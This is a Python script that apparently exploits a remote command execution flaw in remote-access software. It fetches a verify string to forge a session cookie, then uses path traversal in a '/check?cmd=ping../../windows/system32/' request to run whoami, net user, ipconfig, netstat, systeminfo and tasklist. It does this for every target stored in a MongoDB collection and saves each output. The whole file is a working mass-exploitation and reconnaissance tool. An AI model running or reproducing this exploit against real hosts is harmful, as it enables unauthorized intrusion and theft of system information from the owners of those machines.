import pymongo
import requests
import json
client = pymongo.MongoClient(host='localhost', port=27017)

db = client['test']

mycol = db['sunlight']

# dbs = client.list_database_names() #查看所有的database
# print(dbs)
# db.drop()

def getshell(url,user):
    try:
        dic={}
        dic['url']=url
        vul_url = url + "/cgi-bin/rpc?action=verify-haras"
        reps = json.loads(requests.get(vul_url, verify=False, timeout=5).text)
        verify_string = (reps['verify_string'])
        cookies = {"CID": verify_string}
        print(cookies)

        commands=['whoami','net user','ipconfig /all',"netstat -an ",'systeminfo','tasklist']
        # commands=['whoami']
        for command in commands:
            poc11 = url + "/check?cmd=ping../../../../../../windows/system32/" + command
            # poc11 = url + "/check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2FWindowsPowerShell%2Fv1.0%2Fpowershell.exe+%20whoami"
            poc_reps = requests.get(poc11, cookies=cookies, timeout=24, verify=False).text
   
            print(command," : ",poc_reps)
            # dic[command]=poc_reps
            newvalues = { "$set": { command: poc_reps } }
            mycol.update_one(user, newvalues)

        # print(dic)
    except TimeoutError:
        pass
    except Exception as e:
        pass
# mycol.drop()


for user in mycol.find():
    #index=1688
    
    ip=user['url']
    try:
        if user['net user'] is None:
            print(user)
            getshell(ip,user)
    except Exception as e:
        print(user)
        getshell(ip,user)
